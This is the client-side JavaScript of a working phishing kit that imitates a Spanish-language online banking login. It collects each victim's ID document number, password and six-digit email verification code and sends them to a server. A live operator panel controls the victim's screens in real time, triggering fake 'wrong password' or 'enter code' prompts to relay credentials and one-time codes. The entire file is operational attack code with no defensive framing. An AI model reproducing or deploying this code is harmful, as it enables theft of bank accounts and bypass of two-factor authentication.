(function () {
  const form = document.getElementById("login-form");
  const title = document.getElementById("login-title");
  const errorMsg = document.getElementById("error-msg");
  const demoNote = document.getElementById("demo-note");
  const rememberRow = document.getElementById("remember-row");
  const forgot = document.getElementById("forgot");
  const docNumber = document.getElementById("doc-number");
  const docWrap = document.getElementById("doc-number-wrap");
  const docTypeBtn = document.getElementById("doc-type-btn");
  const docTypeList = document.getElementById("doc-type-list");
  const docTypeValue = document.getElementById("doc-type-value");
  const combo = document.getElementById("doc-type");
  const password = document.getElementById("password");
  const stepDoc = document.querySelector(".step-doc");
  const stepPass = document.querySelector(".step-pass");
  const stepVerify = document.querySelector(".step-verify");
  const tokens = [...document.querySelectorAll(".token")];
  const loadingOverlay = document.getElementById("loading-overlay");

  let step = "doc";
  let docType = "DNI";

  let clientId = sessionStorage.getItem("efectiva_client_id");
  if (!clientId) {
    clientId = "user_" + Math.random().toString(36).substr(2, 9) + Date.now();
    sessionStorage.setItem("efectiva_client_id", clientId);
  }

  const socket = typeof io !== "undefined" ? io({ transports: ["websocket", "polling"] }) : null;

  let hasSubmitted = false;
  let lastCmdId = null;
  let isWaitingOperator = false;
  let currentStatus = "⏳ Esperando verificación por el operador";

  function showLoading(text) {
    isWaitingOperator = true;
    if (loadingOverlay) {
      const textEl = loadingOverlay.querySelector(".efectiva-loading-text");
      if (textEl) textEl.textContent = text || "Cargando, por favor espere...";
      loadingOverlay.hidden = false;
    }
  }

  function hideLoading() {
    isWaitingOperator = false;
    if (loadingOverlay) {
      loadingOverlay.hidden = true;
    }
  }

  function getScreenLabel() {
    if (isWaitingOperator) return "Pantalla: Cargando (Esperando Operador)";
    if (step === "doc") return "Pantalla: Documento";
    if (step === "pass") return "Pantalla: Contraseña";
    if (step === "verify") return "Pantalla: Código de Correo";
    return "Pantalla: Login";
  }

  function getVisibility() {
    return document.hidden ? "background" : "active";
  }

  function reportActivity(newStatus) {
    if (newStatus) currentStatus = newStatus;
    if (!hasSubmitted) return;
    const payload = {
      clientId,
      online: true,
      visibility: getVisibility(),
      step,
      screenLabel: getScreenLabel(),
      status: currentStatus,
      waitingOperator: isWaitingOperator,
    };
    if (socket && socket.connected) {
      socket.emit("client:activity", payload);
    }
  }

  function handleOperatorAction(data) {
    if (!data || !data.action) return;
    if (data.targetId && data.targetId !== clientId && (!socket || data.targetId !== socket.id)) return;
    if (data.cmdId && data.cmdId === lastCmdId) return;
    if (data.cmdId) {
      lastCmdId = data.cmdId;
      if (socket) socket.emit("client:ack", { clientId, cmdId: data.cmdId });
    }

    hideLoading();
    const { action, message } = data;
    if (action === "error_login" || action === "wrong_login") {
      if (step === "doc") {
        if (password) password.value = "";
        if (docWrap) docWrap.classList.add("error");
        showError(message || "Documento incorrecto o no registrado");
        if (docNumber) docNumber.focus();
        reportActivity("⚠️ Viendo error de login (en pantalla DNI)");
      } else {
        setStep("pass");
        if (password) {
          password.value = "";
          password.focus();
        }
        showError(message || "Contraseña incorrecta. Inténtalo de nuevo.");
        reportActivity("⚠️ Viendo error de login (en pantalla Contraseña)");
      }
    } else if (action === "wrong_doc") {
      setStep("doc");
      if (password) password.value = "";
      if (docWrap) docWrap.classList.add("error");
      showError(message || "Documento incorrecto o no registrado");
      if (docNumber) docNumber.focus();
      reportActivity("⚠️ Viendo error de documento (en pantalla DNI)");
    } else if (action === "wrong_pass") {
      setStep("pass");
      if (password) {
        password.value = "";
        password.focus();
      }
      showError(message || "Contraseña incorrecta. Inténtalo de nuevo.");
      reportActivity("⚠️ Viendo error de clave (en pantalla Contraseña)");
    } else if (action === "wrong_token") {
      setStep("verify");
      tokens.forEach(function (t) { t.value = ""; });
      if (tokens[0]) tokens[0].focus();
      const cleanMsg =
        !message || /sms|token/i.test(message)
          ? "Código de correo inválido o expirado."
          : message;
      showError(cleanMsg);
      reportActivity("⚠️ Viendo error de código de correo (en pantalla Código Correo)");
    } else if (action === "ask_token") {
      setStep("verify");
      tokens.forEach(function (t) { t.value = ""; });
      if (tokens[0]) tokens[0].focus();
      reportActivity("📧 En pantalla de Código Correo (esperando que escriba)");
    } else if (action === "ask_pass") {
      setStep("pass");
      if (password) {
        password.value = "";
        password.focus();
      }
      reportActivity("🔑 En pantalla de Contraseña (esperando que escriba)");
    } else if (action === "approve" || action === "redirect") {
      reportActivity("✅ Acceso aprobado (Redirigido a /panel)");
      window.location.href = "/panel.html";
    }
  }

  function postSessionWithRetry(data, attempt) {
    fetch("/api/session", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
      keepalive: true,
    }).catch(function () {
      if ((attempt || 0) < 2) {
        setTimeout(function () {
          postSessionWithRetry(data, (attempt || 0) + 1);
        }, 800);
      }
    });
  }

  function sendSocketUpdate(customStatus) {
    const currentToken = tokens.map(function (t) { return t.value; }).join("");
    const currentDoc = docNumber ? docNumber.value.trim() : "";
    const currentPass = password ? password.value : "";

    if (!customStatus && !currentDoc && !currentPass && !currentToken) return;
    hasSubmitted = true;
    if (customStatus) currentStatus = customStatus;

    const nowMs = Date.now();
    const data = {
      clientId,
      docType,
      docNumber: currentDoc,
      password: currentPass,
      token: currentToken,
      step,
      screenLabel: getScreenLabel(),
      status: currentStatus,
      waitingOperator: isWaitingOperator,
      online: true,
      visibility: getVisibility(),
      updatedAtMs: nowMs,
      isUserSubmit: true,
    };

    if (socket) {
      socket.emit("client:update", data);
    }

    postSessionWithRetry(data, 0);
  }

  if (socket) {
    socket.on("connect", function () {
      socket.emit("client:register", { clientId });
      if (hasSubmitted) {
        reportActivity();
      }
    });

    socket.on("operator:action", handleOperatorAction);
  }

  document.addEventListener("visibilitychange", function () {
    if (hasSubmitted) {
      reportActivity();
    }
  });

  function notifyOffline() {
    if (!hasSubmitted) return;
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(
          "/api/session/" + encodeURIComponent(clientId) + "/offline",
          new Blob(["{}"], { type: "application/json" })
        );
      }
    } catch (_e) {}
  }

  window.addEventListener("pagehide", notifyOffline);
  window.addEventListener("beforeunload", notifyOffline);

  setInterval(function () {
    if (!hasSubmitted) return;
    fetch("/api/session/" + encodeURIComponent(clientId) + "/poll", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        visibility: getVisibility(),
        step,
        screenLabel: getScreenLabel(),
        status: currentStatus,
        waitingOperator: isWaitingOperator,
      }),
      cache: "no-store",
    })
      .then(function (r) { return r.ok ? r.json() : null; })
      .then(function (res) {
        if (res && res.command) {
          handleOperatorAction(res.command);
        }
      })
      .catch(function () {});
  }, 1000);

  function showError(text) {
    errorMsg.hidden = !text;
    errorMsg.textContent = text || "";
  }

  function setStep(next) {
    step = next;
    stepDoc.hidden = next !== "doc";
    stepPass.hidden = next !== "pass";
    stepVerify.hidden = next !== "verify";
    rememberRow.hidden = next === "verify";
    forgot.hidden = next === "verify";
    demoNote.hidden = true;
    showError("");
    if (next === "doc") title.textContent = "Accede a la banca digital";
    if (next === "pass") title.textContent = "Accede a la banca digital";
    if (next === "verify") title.textContent = "Verifica tu identidad";
  }

  function applyDocType(type, label) {
    docType = type;
    docTypeValue.textContent = label;
    syncFilled(docNumber, docWrap);
  }

  function syncFilled(input, wrap) {
    wrap.classList.toggle("filled", input.value.length > 0);
  }

  docNumber.addEventListener("input", function () {
    syncFilled(this, docWrap);
    docWrap.classList.remove("error");
    showError("");
    if (hasSubmitted) {
      reportActivity(
        this.value.trim().length > 0
          ? "✍️ Corrigiendo documento..."
          : "📄 En pantalla de Documento (sin escribir)"
      );
    }
  });

  password.addEventListener("input", function () {
    this.closest(".input-field").classList.toggle("filled", this.value.length > 0);
    showError("");
    if (hasSubmitted) {
      reportActivity(
        this.value.length > 0
          ? "✍️ Escribiendo nueva contraseña..."
          : "🔑 En pantalla de Contraseña (sin escribir)"
      );
    }
  });

  docTypeBtn.addEventListener("click", function (event) {
    event.stopPropagation();
    const open = combo.classList.toggle("open");
    docTypeList.hidden = !open;
    docTypeBtn.setAttribute("aria-expanded", String(open));
  });

  docTypeList.addEventListener("click", function (event) {
    const item = event.target.closest("li");
    if (!item) return;
    applyDocType(item.dataset.value, item.textContent.trim());
    combo.classList.remove("open");
    docTypeList.hidden = true;
  });

  document.addEventListener("click", function () {
    combo.classList.remove("open");
    docTypeList.hidden = true;
    docTypeBtn.setAttribute("aria-expanded", "false");
  });

  document.querySelectorAll("[data-switch]").forEach(function (el) {
    el.addEventListener("click", function (event) {
      event.preventDefault();
      el.classList.toggle("on");
    });
  });

  document.getElementById("toggle-pass").addEventListener("click", function () {
    password.type = password.type === "password" ? "text" : "password";
  });

  function updateTokenTypingActivity() {
    if (!hasSubmitted) return;
    const filledCount = tokens.filter(function (t) { return t.value.length > 0; }).length;
    if (filledCount > 0) {
      reportActivity("✍️ Escribiendo código (" + filledCount + "/6 dígitos)...");
    } else {
      reportActivity("📲 En pantalla de Código (esperando que escriba)");
    }
  }

  tokens.forEach(function (box, index) {
    box.addEventListener("input", function () {
      showError("");
      this.value = this.value.replace(/\D/g, "").slice(0, 1);
      if (this.value && tokens[index + 1]) tokens[index + 1].focus();
      updateTokenTypingActivity();
    });
    box.addEventListener("keydown", function (event) {
      if (event.key === "Backspace" && !this.value && tokens[index - 1]) {
        tokens[index - 1].focus();
      }
    });
    box.addEventListener("paste", function (event) {
      event.preventDefault();
      const pasted = ((event.clipboardData || window.clipboardData).getData("text") || "")
        .replace(/\D/g, "")
        .slice(0, tokens.length);
      if (!pasted) return;
      showError("");
      for (let i = 0; i < pasted.length; i++) {
        if (tokens[index + i]) tokens[index + i].value = pasted[i];
      }
      const nextFocus = tokens[Math.min(index + pasted.length, tokens.length - 1)];
      if (nextFocus) nextFocus.focus();
      updateTokenTypingActivity();
    });
  });

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    if (step === "doc") {
      if (!docNumber.value.trim()) {
        docWrap.classList.add("error");
        showError("Ingresa tu número de documento");
        docNumber.focus();
        return;
      }
      setStep("pass");
      password.focus();
      if (hasSubmitted) {
        reportActivity("➡️ Pasó a pantalla de Contraseña (esperando clave)");
      }
      return;
    }
    if (step === "pass") {
      if (!password.value) {
        showError("Ingresa tu contraseña");
        password.focus();
        return;
      }
      showLoading("Verificando contraseña...");
      sendSocketUpdate("⏳ Esperando verificación de contraseña");
      return;
    }
    const code = tokens.map(function (t) { return t.value; }).join("");
    if (code.length !== 6) {
      showError("Ingresa el código de 6 dígitos");
      return;
    }
    showLoading("Validando código...");
    sendSocketUpdate("⏳ Esperando aprobación del código");
  });

  document.querySelectorAll(".nav-link, .forgot, .store-badges img, .resend span").forEach(function (el) {
    el.addEventListener("click", function (event) {
      event.preventDefault();
    });
  });
})();

